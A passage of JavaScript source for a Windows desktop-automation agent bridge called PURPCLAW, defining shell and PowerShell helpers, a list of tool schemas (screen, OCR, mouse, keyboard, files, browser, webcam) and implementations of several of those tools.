  const finalCaps = allowScope ? [...caps].filter(c => allowScope.has(c)) : [...caps];
  return { caps: finalCaps, agent: agentBinding, skill: skillBinding };
}

async function ps(cmd, timeout = 15000) {
  try {
    const { stdout, stderr } = await execAsync(`${PS_PREFIX} "${cmd}"`, { timeout, maxBuffer: 5 * 1024 * 1024 });
    return (stdout || stderr || 'Done').trim();
  } catch (e) { return `Error: ${e.message.substring(0, 500)}`; }
}

async function psScript(script, timeout = 15000) {
  const tmp = path.join(os.tmpdir(), `bridge_${Date.now()}.ps1`);
  try {
    fs.writeFileSync(tmp, script, 'utf8');
    const { stdout, stderr } = await execAsync(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${tmp}"`, { timeout, maxBuffer: 5 * 1024 * 1024 });
    try { fs.unlinkSync(tmp); } catch (e) {}
    return (stdout || stderr || 'Done').trim();
  } catch (e) {
    try { fs.unlinkSync(tmp); } catch (e) {}
    return `Error: ${e.message.substring(0, 500)}`;
  }
}

async function cmd(command, timeout = 15000) {
  // RIP-OUT FIX: was `execAsync(..., { shell: 'cmd.exe' })` which is
  // untracked. Now uses the child-registry's execSafe so it's bounded
  // and the child gets killed if the parent dies.
  const r = await execSafe(command, [], { shell: 'cmd.exe', timeoutMs: timeout });
  if (r.code === -1 && !r.stdout && !r.stderr) return `Error: ${r.stderr || 'unknown'}`;
  return ((r.stdout || r.stderr || 'Done').trim()).substring(0, 5000);
}

function httpReq(url, method = 'GET', body) {
  return new Promise((res, rej) => {
    try {
      const u = new URL(url);
      const m = u.protocol === 'https:' ? https : http;
      const r = m.request({ hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers: { 'Content-Type': 'application/json' } }, resp => {
        let d = ''; resp.on('data', c => d += c); resp.on('end', () => res(`HTTP ${resp.statusCode}\n${d.substring(0, 3000)}`));
      });
      r.on('error', e => rej(e));
      r.setTimeout(15000, () => { r.destroy(); rej(new Error('Timeout')); });
      if (body) r.write(typeof body === 'string' ? body : JSON.stringify(body));
      r.end();
    } catch (e) { rej(e); }
  });
}

const BROWSER_SESSION = require('./lib/browser-session');

async function getBrowserContext() {
  return BROWSER_SESSION.context();
}

async function getBrowserPage() {
  return BROWSER_SESSION.page();
}

// Compatibility schemas for the old bridge executor only. This array is not
// published and is not a registry: canonical discovery comes from lib/tools.
const LEGACY_BRIDGE_TOOL_SCHEMAS = [
  { name: 'screen_capture', description: 'Screenshot the screen. Returns file path.', inputSchema: { type: 'object', properties: { monitor: { type: 'number' } } } },
  { name: 'screen_ocr', description: 'Read text from screen using OCR. Supports line grouping and structured output.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' } } } },
  { name: 'ocr_identify', description: 'Advanced OCR with line detection. Read text and identify line-by-line structure.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' } } } },
  { name: 'screen_identify', description: 'Combined screen analysis: captures screen, runs OCR and object detection (YOLO). Returns comprehensive description of what is visible on screen.', inputSchema: { type: 'object', properties: { confidence: { type: 'number' } } } },
  { name: 'screen_find_object', description: 'Detect objects on screen with YOLO.', inputSchema: { type: 'object', properties: { image_path: { type: 'string' }, confidence: { type: 'number' } } } },
  { name: 'screen_find_template', description: 'Find image on screen (template match).', inputSchema: { type: 'object', properties: { template_path: { type: 'string' } }, required: ['template_path'] } },
  { name: 'screen_info', description: 'Get monitor sizes and positions.', inputSchema: { type: 'object', properties: {} } },
  { name: 'ui_list_elements', description: 'List all interactive UI elements across all windows. Shows name, type, location, window. Best for finding buttons, inputs, menus.', inputSchema: { type: 'object', properties: { filter: { type: 'string' }, max_results: { type: 'number' } } } },
  { name: 'ui_click_element', description: 'Click a UI element by name pattern. Searches all windows and clicks the first match. Supports: Button, MenuItem, Tab, Edit, ComboBox, Slider, List, Hyperlink, etc.', inputSchema: { type: 'object', properties: { name: { type: 'string' }, button: { type: 'string', enum: ['left', 'right', 'double'] } }, required: ['name'] } },
  { name: 'ui_get_screen_layout', description: 'Get complete visual layout map of screen: all windows, elements, coordinates. Returns comprehensive map with element positions.', inputSchema: { type: 'object', properties: {} } },
  { name: 'ui_get_element_at', description: 'Get UI element at specific screen coordinates. Returns element name, type, and window.', inputSchema: { type: 'object', properties: { x: { type: 'number' }, y: { type: 'number' } }, required: ['x', 'y'] } },
  { name: 'mouse_click', description: 'Click at coordinates. Supports left/right/double/drag.', inputSchema: { type: 'object', properties: { x: { type: 'number' }, y: { type: 'number' }, button: { type: 'string', enum: ['left', 'right', 'middle'] }, double: { type: 'boolean' }, drag_to_x: { type: 'number' }, drag_to_y: { type: 'number' } }, required: ['x', 'y'] } },
  { name: 'mouse_scroll', description: 'Scroll mouse wheel.', inputSchema: { type: 'object', properties: { direction: { type: 'string', enum: ['up', 'down'] }, amount: { type: 'number' }, x: { type: 'number' }, y: { type: 'number' } }, required: ['direction'] } },
  { name: 'keyboard_type', description: 'Type text or press shortcuts (ctrl+c, alt+f4, enter, etc).', inputSchema: { type: 'object', properties: { text: { type: 'string' }, shortcut: { type: 'string' } } } },
  { name: 'find_and_click', description: 'Find UI element by text label and click it.', inputSchema: { type: 'object', properties: { target: { type: 'string' }, click_type: { type: 'string', enum: ['left', 'right', 'double'] } }, required: ['target'] } },
  { name: 'window_list', description: 'List open windows.', inputSchema: { type: 'object', properties: { filter: { type: 'string' } } } },
  { name: 'window_focus', description: 'Focus a window by title.', inputSchema: { type: 'object', properties: { window_title: { type: 'string' } }, required: ['window_title'] } },
  { name: 'window_close', description: 'Close a window by title or active window.', inputSchema: { type: 'object', properties: { title: { type: 'string' } } } },
  { name: 'file_read', description: 'Read file contents.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, max_lines: { type: 'number' } }, required: ['path'] } },
  { name: 'file_write', description: 'Write content to a file.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, content: { type: 'string' }, append: { type: 'boolean' } }, required: ['path', 'content'] } },
  { name: 'file_list', description: 'List directory contents.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, recursive: { type: 'boolean' } }, required: ['path'] } },
  { name: 'file_search', description: 'Search files by name or content.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, query: { type: 'string' }, in_content: { type: 'boolean' } }, required: ['path', 'query'] } },
  { name: 'browser_open', description: 'Open URL in browser via Playwright.', inputSchema: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] } },
  { name: 'browser_click', description: 'Click a link, button, or element on the current page.', inputSchema: { type: 'object', properties: { target: { type: 'string' }, index: { type: 'number' } }, required: ['target'] } },
  { name: 'browser_type', description: 'Type text into a form field on the page.', inputSchema: { type: 'object', properties: { selector: { type: 'string' }, text: { type: 'string' }, submit: { type: 'boolean' } }, required: ['text'] } },
  { name: 'browser_scroll', description: 'Scroll the page up or down.', inputSchema: { type: 'object', properties: { direction: { type: 'string', enum: ['up', 'down'] }, amount: { type: 'number' } } } },
  { name: 'browser_get_content', description: 'Read the visible text content of the current page.', inputSchema: { type: 'object', properties: { selector: { type: 'string' }, max_length: { type: 'number' } } } },
  { name: 'browser_screenshot', description: 'Take a screenshot of the current browser page.', inputSchema: { type: 'object', properties: {} } },
  { name: 'browser_navigate', description: 'Navigate to URL in current tab, or go back/forward.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, action: { type: 'string', enum: ['goto', 'back', 'forward', 'reload'] } } } },
  { name: 'browser_tabs', description: 'List open browser pages.', inputSchema: { type: 'object', properties: {} } },
  { name: 'browser_close_tab', description: 'Close a browser tab.', inputSchema: { type: 'object', properties: { index: { type: 'number' }, title: { type: 'string' } } } },
  { name: 'purpclaw_start', description: 'Start PURPCLAW AI build pipeline.', inputSchema: { type: 'object', properties: { task: { type: 'string' }, output_dir: { type: 'string' } }, required: ['task'] } },
  { name: 'purpclaw_stop', description: 'Stop running pipeline.', inputSchema: { type: 'object', properties: {} } },
  { name: 'purpclaw_status', description: 'Get pipeline status.', inputSchema: { type: 'object', properties: {} } },
  { name: 'purpclaw_logs', description: 'Get pipeline logs.', inputSchema: { type: 'object', properties: { lines: { type: 'number' } } } },
  { name: 'git_command', description: 'Run git commands.', inputSchema: { type: 'object', properties: { command: { type: 'string' }, cwd: { type: 'string' } }, required: ['command'] } },
  { name: 'http_request', description: 'Make HTTP requests.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, method: { type: 'string', enum: ['GET', 'POST', 'PUT', 'DELETE'] }, body: { type: 'string' } }, required: ['url'] } },
  { name: 'clipboard', description: 'Read or write clipboard.', inputSchema: { type: 'object', properties: { action: { type: 'string', enum: ['read', 'write'] }, text: { type: 'string' } }, required: ['action'] } },
  { name: 'execute_command', description: 'Execute shell command.', inputSchema: { type: 'object', properties: { command: { type: 'string' }, cwd: { type: 'string' } }, required: ['command'] } },
  { name: 'open_application', description: 'Open app by name.', inputSchema: { type: 'object', properties: { app_name: { type: 'string' } }, required: ['app_name'] } },
  { name: 'speak', description: 'Speak via TTS.', inputSchema: { type: 'object', properties: { message: { type: 'string' } }, required: ['message'] } },
  { name: 'memory', description: 'Persistent memory (remember/recall/forget/list).', inputSchema: { type: 'object', properties: { action: { type: 'string', enum: ['remember', 'recall', 'forget', 'list'] }, content: { type: 'string' } }, required: ['action'] } },
  { name: 'notification', description: 'Desktop toast notification.', inputSchema: { type: 'object', properties: { title: { type: 'string' }, message: { type: 'string' } }, required: ['title', 'message'] } },
  { name: 'task_schedule', description: 'Schedule background task.', inputSchema: { type: 'object', properties: { description: { type: 'string' }, delay_seconds: { type: 'number' }, command: { type: 'string' } }, required: ['description', 'delay_seconds', 'command'] } },
  { name: 'task_list', description: 'List background tasks.', inputSchema: { type: 'object', properties: {} } },
  { name: 'webcam_look', description: 'Take a photo with the PC webcam.', inputSchema: { type: 'object', properties: { camera: { type: 'number' } } } },
  { name: 'webcam_detect', description: 'Detect people/faces/objects via webcam using YOLO.', inputSchema: { type: 'object', properties: { confidence: { type: 'number' }, camera: { type: 'number' } } } },
  { name: 'webcam_read', description: 'Read any text visible to the webcam using OCR.', inputSchema: { type: 'object', properties: { camera: { type: 'number' } } } },
  { name: 'file_copy', description: 'Copy a file or directory.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'file_move', description: 'Move or rename a file/directory.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'file_delete', description: 'Delete a file or empty directory.', inputSchema: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } },
  { name: 'dir_create', description: 'Create a directory (and parents).', inputSchema: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } },
  { name: 'download_file', description: 'Download a file from a URL to local path.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, destination: { type: 'string' } }, required: ['url'] } },
  { name: 'process_list', description: 'List running processes. Filter by name.', inputSchema: { type: 'object', properties: { filter: { type: 'string' }, sort_by: { type: 'string', enum: ['mem', 'cpu', 'name'] } } } },
  { name: 'process_kill', description: 'Kill a process by name or PID.', inputSchema: { type: 'object', properties: { name: { type: 'string' }, pid: { type: 'number' } } } },
  { name: 'volume_control', description: 'Set system volume or mute/unmute.', inputSchema: { type: 'object', properties: { level: { type: 'number' }, action: { type: 'string', enum: ['set', 'mute', 'unmute', 'up', 'down'] } } } },
  { name: 'zip_create', description: 'Create a zip archive from files/folder.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'zip_extract', description: 'Extract a zip archive.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source'] } },
  { name: 'install_package', description: 'Install packages via pip, npm, or choco.', inputSchema: { type: 'object', properties: { manager: { type: 'string', enum: ['pip', 'npm', 'choco'] }, packages: { type: 'string' }, cwd: { type: 'string' } }, required: ['manager', 'packages'] } },
  { name: 'active_window', description: 'Get info about the currently focused window.', inputSchema: { type: 'object', properties: {} } },
  { name: 'system_status', description: 'PC health check (CPU, RAM, disk, processes).', inputSchema: { type: 'object', properties: {} } },
  { name: 'system_paths', description: 'Returns all standard Windows filesystem paths.', inputSchema: { type: 'object', properties: {} } },
  { name: 'disk_info', description: 'Get disk space info for all drives.', inputSchema: { type: 'object', properties: {} } },
  { name: 'network_info', description: 'Get IP addresses, WiFi status, internet connectivity.', inputSchema: { type: 'object', properties: {} } },
  { name: 'load_toolset', description: 'Switch the active toolset context.', inputSchema: { type: 'object', properties: { set: { type: 'string', enum: ['core', 'browser', 'files', 'os', 'webcam', 'all'] } }, required: ['set'] } },
  { name: 'get_weather', description: 'Get current weather for a location.', inputSchema: { type: 'object', properties: { location: { type: 'string' } } } },
  { name: 'search_music', description: 'Search for music tracks.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'play_music', description: 'Play music track or open music in browser.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'search_knowledge', description: 'Search Wikipedia and general knowledge.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'search_memory', description: 'Search the PURPCLAW memory store for information.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } }
];

const loadedSkills = {};
const CORE_PRESERVE = ['interactive_shell', 'skill_manager', 'task_manager', 'speak', 'memory', 'file_read', 'file_write', 'socket_rig', 'purpclaw_start', 'system_status', 'load_toolset', 'window_list'];
let ACTIVE_TOOLSET = 'all';

function loadDynamicSkills() {
  if (!fs.existsSync(SKILLS_DIR)) fs.mkdirSync(SKILLS_DIR, { recursive: true });
  const files = fs.readdirSync(SKILLS_DIR).filter(f => f.endsWith('.js') && !f.endsWith('.pending.js'));
  for (const file of files) {
    try {
      const fullPath = path.join(SKILLS_DIR, file);
      delete require.cache[require.resolve(fullPath)];
      const skillDef = require(fullPath);
      if (skillDef.name && skillDef.description && typeof skillDef.handler === 'function') {
        loadedSkills[skillDef.name] = skillDef.handler;
      }
    } catch (e) { console.error(`[SKILLS] Failed to load ${file}: ${e.message}`); }
  }
}

async function executeTool(name, args) {
  const t0 = Date.now();
  safeLog('TOOL', `${name} ${JSON.stringify(args).substring(0, 120)}`);

  const ebCalledPayload = JSON.stringify({ topic: 'tool.called', toolName: name, args });
  const ebCalledReq = http.request({ hostname: 'localhost', port: 7782, path: '/publish', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(ebCalledPayload) } }, () => {});
  ebCalledReq.on('error', () => {});
  ebCalledReq.write(ebCalledPayload);
  ebCalledReq.end();

  let result = null;
  if (loadedSkills[name]) {
    try {
      const res = await loadedSkills[name](args, { ps, psScript, cmd, ok, execAsync, config: { PURP_DIR, SKILLS_DIR } });
      safeLog('TOOL', `OK ${name} (${Date.now() - t0}ms)`);
      result = ok(res);
    } catch (e) { result = ok(`Dynamic Skill Error: ${e.message}`); }
  } else {
    try {
      result = await runTool(name, args);
      safeLog('TOOL', `OK ${name} (${Date.now() - t0}ms)`);
    } catch (e) { result = ok(`Error: ${e.message}`); }
  }

  const ebResultPayload = JSON.stringify({ topic: 'tool.result', toolName: name, duration: Date.now() - t0 });
  const ebResultReq = http.request({ hostname: 'localhost', port: 7782, path: '/publish', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(ebResultPayload) } }, () => {});
  ebResultReq.on('error', () => {});
  ebResultReq.write(ebResultPayload);
  ebResultReq.end();

  return result;
}

async function runTool(name, args) {
  switch (name) {
    case 'load_toolset': {
      const allowed = ['core', 'browser', 'files', 'os', 'webcam', 'all'];
      const ns = args.set.toLowerCase();
      if (!allowed.includes(ns)) return ok(`Invalid set. Use: ${allowed.join(', ')}`);
      ACTIVE_TOOLSET = ns;
      loadDynamicSkills();
      return ok(`Switched tool context to '${ns}'`);
    }
    case 'screen_capture': {
      const outPath = path.join(os.tmpdir(), `screen_${Date.now()}.png`).replace(/\\/g, '\\\\');
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bmp.Save("${outPath}")
$gfx.Dispose()
$bmp.Dispose()
Write-Output "Screenshot saved: ${outPath} ($($screen.Width)x$($screen.Height))"
`, 10000);
      return ok(r);
    }
    case 'screen_ocr':
    case 'ocr_identify': {
      const img = args.image_path || path.join(os.tmpdir(), `ocr_${Date.now()}.png`);
      const pyScript = `
import mss, mss.tools, pytesseract, json
pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
from PIL import Image
${!args.image_path ? `
with mss.mss() as sct:
    shot = sct.grab(sct.monitors[1])
    mss.tools.to_png(shot.rgb, shot.size, output=r"${img}")
` : ''}
img = Image.open(r"${img}")
# Use LSTM OCR engine (oem=3) with uniform text block (psm=6)
text = pytesseract.image_to_string(img, config='--oem 3 --psm 6').strip()
# Also get structured data with bounding boxes
data = pytesseract.image_to_data(img, config='--oem 3 --psm 6', output_type=pytesseract.Output.DICT)
lines = []
current_line = []
current_y = -1
for i, txt in enumerate(data['text']):
    if txt.strip():
        if current_y > 0 and abs(data['top'][i] - current_y) > 15:
            if current_line:
                lines.append(' '.join(current_line))
            current_line = []
        current_line.append(txt)
        current_y = data['top'][i]
if current_line:
    lines.append(' '.join(current_line))
full_text = '\\n'.join(lines)
word_count = len([w for w in data['text'] if w.strip()])
print(json.dumps({"text": full_text, "raw_text": text, "words": word_count, "lines": len(lines)}, ensure_ascii=False))
`;
      const tmp = path.join(os.tmpdir(), `ocr_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 30000 }).catch(e => ({ stdout: `Error: ${e.message}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        const prefix = data.lines > 5 ? `[SCREEN - ${data.lines} lines, ${data.words} words]\n` : `[SCREEN - ${data.words} words]\n`;
        return ok(prefix + data.text);
      } catch (e) { return ok(r.stdout || 'OCR failed - no text detected'); }
    }
    case 'screen_find_object': {
      const isUserPath = !!args.image_path;
      const imgPathRaw = args.image_path || path.join(os.tmpdir(), `det_${Date.now()}.png`);
      const imgPathEscaped = imgPathRaw.replace(/\\/g, '\\\\');
      if (!isUserPath) {
        await psScript(`
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object Drawing.Bitmap($s.Width,$s.Height)
$g=[Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
$b.Save("${imgPathEscaped}")
$g.Dispose();$b.Dispose()
`, 10000);
      }
      // Use YOLO service on port 7779 for cached model (use raw path, not escaped)
      const confidence = args.confidence || 0.5;
      const body = JSON.stringify({ image: imgPathRaw, confidence });
      const postData = Buffer.from(body);
      const yoloReq = await new Promise((resolve) => {
        const options = {
          hostname: '127.0.0.1',
          port: 7779,
          path: '/detect',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
        };
        const yoloConn = http.request(options, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        });
        yoloConn.on('error', () => resolve(null));
        yoloConn.write(postData);
        yoloConn.end();
      }).catch(() => null);
      if (!yoloReq) return ok('YOLO service unavailable - ensure yolo_service.py is running');
      try {
        const result = JSON.parse(yoloReq);
        if (!result.success) return ok(`Detection error: ${result.error}`);
        const objs = result.objects.map(o => `${o.class} (${(o.conf*100).toFixed(0)}%) at (${o.center[0]},${o.center[1]})`).join(', ');
        return ok(result.count === 0 ? 'No objects detected' : `${result.count} objects: ${objs}`);
      } catch { return ok(yoloReq || 'Detection failed'); }
    }
    case 'screen_identify': {
      // Combined: capture + OCR + object detection for full screen understanding
      const imgPath = path.join(os.tmpdir(), `identify_${Date.now()}.png`).replace(/\\/g, '\\\\');
      const imgPathRaw = path.join(os.tmpdir(), `identify_${Date.now()}.png`);
      await psScript(`
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object Drawing.Bitmap($s.Width,$s.Height)
$g=[Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
$b.Save("${imgPath}")
$g.Dispose();$b.Dispose()
`, 10000);
      // OCR with inline Python (fast), YOLO via service (cached model)
      const pyScript = `
import pytesseract, json
from PIL import Image
pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
img = Image.open(r"${imgPath}")
data = pytesseract.image_to_data(img, config='--oem 3 --psm 6', output_type=pytesseract.Output.DICT)
lines_dict = {}
for i, txt in enumerate(data['text']):
    if txt.strip():
        line_idx = round(data['top'][i] / 20)
        if line_idx not in lines_dict:
            lines_dict[line_idx] = []
        lines_dict[line_idx].append(txt)
lines = [' '.join(lines_dict[k]) for k in sorted(lines_dict.keys())]
text = '\\n'.join(lines)
print(json.dumps({"text": text[:3000], "word_count": len([w for w in data['text'] if w.strip()]), "line_count": len(lines)}, ensure_ascii=False))
`;
      const tmp = path.join(os.tmpdir(), `identify_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 30000 }).catch(e => ({ stdout: `Error: ${e.message}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      // YOLO detection via service (using raw path without escaping)
      const body = JSON.stringify({ image: imgPathRaw, confidence: 0.4 });
      const postData = Buffer.from(body);
      const yoloReq = await new Promise((resolve) => {
        const options = {
          hostname: '127.0.0.1',
          port: 7779,
          path: '/detect',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
        };
        const yoloConn = http.request(options, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        });
        yoloConn.on('error', () => resolve(null));
        yoloConn.write(postData);
        yoloConn.end();
      }).catch(() => null);
      try {
        const d = JSON.parse(r.stdout.trim().split('\n').pop());
        const objPart = yoloReq ? (() => {
          try {
            const yoloResult = JSON.parse(yoloReq);
            if (!yoloResult.success) return 'none';
            const objects = yoloResult.objects.map(o => `${o.class} (${(o.conf*100).toFixed(0)}%)`);
            return objects.length ? objects.join(', ') : 'none';
          } catch { return 'none'; }
        })() : 'none';
        const out = `[VISION - ${d.line_count} lines, ${d.word_count} words, ${yoloReq ? JSON.parse(yoloReq).count || 0 : 0} objects detected]\n`;
        const objLine = objPart !== 'none' ? `\n[OBJECTS: ${objPart}]\n` : '\n';
        const textPart = d.text ? `\n[TEXT]\n${d.text}` : '\n[No text detected]';
        return ok(out + objLine + textPart);
      } catch (e) { return ok(r.stdout || 'Screen identify failed'); }
    }
    case 'screen_find_template': { return ok('Template matching: use screen_capture first, then provide template_path'); }
    case 'screen_info': {
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
$i = 0
foreach($m in [System.Windows.Forms.Screen]::AllScreens) {
  Write-Output "Monitor $i: $($m.Bounds.Width)x$($m.Bounds.Height) at ($($m.Bounds.X),$($m.Bounds.Y)) $(if($m.Primary){'[PRIMARY]'})"
  $i++
}
`, 5000);
      return ok(r);
    }
    case 'mouse_click': {
      const x = coord(args.x), y = coord(args.y);
      const btn = args.button || 'left';
      const dn = btn === 'right' ? 8 : btn === 'middle' ? 32 : 2;
      const up = btn === 'right' ? 16 : btn === 'middle' ? 64 : 4;
      if (args.drag_to_x !== undefined) {
        const dx = coord(args.drag_to_x), dy = coord(args.drag_to_y);
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})
Start-Sleep -Milliseconds 50
[W.U]::mouse_event(2,0,0,0,0)
Start-Sleep -Milliseconds 50
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${dx},${dy})
Start-Sleep -Milliseconds 50
[W.U]::mouse_event(4,0,0,0,0)
Write-Output "Dragged (${x},${y}) to (${dx},${dy})"
`, 5000);
        return ok(r);
      }
      const dblCode = args.double ? `[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)\nStart-Sleep -Milliseconds 50\n[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)` : `[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)`;
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})
Start-Sleep -Milliseconds 50
${dblCode}
Write-Output "${args.double?'Double-':''}${btn}-clicked (${x},${y})"
`, 5000);
      return ok(r);
    }
    case 'mouse_scroll': {
      const sv = (args.direction === 'up' ? 120 : -120) * (args.amount || 3);
      let moveCode = '';
      if (args.x !== undefined) moveCode = `Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${coord(args.x)},${coord(args.y)})\nStart-Sleep -Milliseconds 50`;
      const r = await psScript(`
${moveCode}
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[W.U]::mouse_event(0x0800,0,0,${sv},0)
Write-Output "Scrolled ${args.direction} ${args.amount || 3}"
`, 5000);
      return ok(r);
    }
    case 'keyboard_type': {
      if (args.shortcut) {
        const km = { 'ctrl+c': '^c', 'ctrl+v': '^v', 'ctrl+x': '^x', 'ctrl+z': '^z', 'ctrl+a': '^a', 'ctrl+s': '^s', 'ctrl+w': '^w', 'ctrl+t': '^t', 'ctrl+n': '^n', 'ctrl+l': '^l', 'ctrl+shift+t': '^+t', 'ctrl+shift+n': '^+n', 'alt+f4': '%{F4}', 'alt+tab': '%{TAB}', 'enter': '{ENTER}', 'escape': '{ESC}', 'esc': '{ESC}', 'tab': '{TAB}', 'backspace': '{BACKSPACE}', 'delete': '{DELETE}', 'up': '{UP}', 'down': '{DOWN}', 'left': '{LEFT}', 'right': '{RIGHT}', 'home': '{HOME}', 'end': '{END}', 'pageup': '{PGUP}', 'pagedown': '{PGDN}', 'f1': '{F1}', 'f2': '{F2}', 'f3': '{F3}', 'f4': '{F4}', 'f5': '{F5}', 'f11': '{F11}', 'f12': '{F12}', 'print_screen': '{PRTSC}' };
        const k = km[args.shortcut.toLowerCase()] || args.shortcut;
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('${k}')
Write-Output "Pressed: ${args.shortcut}"
`, 5000);
        return ok(r);
      }
      if (args.text) {
        const safe = san(args.text);
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('${safe}')
Write-Output "Typed ${safe.length} chars"
`, 5000);
        return ok(r);
      }
      return ok('Specify text or shortcut');
    }
    case 'find_and_click': {
      const target = san(args.target || '');
      const ce = (args.click_type || 'left') === 'right' ? '[W.U]::mouse_event(8,0,0,0,0);[W.U]::mouse_event(16,0,0,0,0)' : (args.click_type || 'left') === 'double' ? '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0);Start-Sleep -ms 50;[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)' : '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)';
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$target = '${target}'
$found = $false
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
foreach ($el in $els) {
  try {
    $n = $el.Current.Name
    $t = $el.Current.ControlType.ProgrammaticName
    if ($n -like "*$target*") {
      $r = $el.Current.BoundingRectangle
      if ($r.Width -gt 0 -and $r.Height -gt 0) {
        $cx = [int]($r.X + $r.Width / 2)
        $cy = [int]($r.Y + $r.Height / 2)
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($cx, $cy)
        Start-Sleep -Milliseconds 100
        ${ce}
        Write-Output "CLICKED: '$n' ($t) at ($cx,$cy)"
        $found = $true; break
      }
    }
  } catch { continue }
}
if (-not $found) {
  $vis = @()
  foreach ($el in $els) {
    try {
      $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
      if ($n -and $n.Length -gt 0 -and $n.Length -lt 60 -and $t -match 'Button|MenuItem|TabItem|Hyperlink|ListItem') {
        $r = $el.Current.BoundingRectangle
        if ($r.Width -gt 0) { $vis += "$t : '$n'" }
      }
    } catch { continue }
  }
  Write-Output "NOT FOUND: '$target'"
  $vis | Select-Object -First 20 | ForEach-Object { Write-Output $_ }
}
`, 20000);
      return ok(r);
    }
    case 'window_list': {
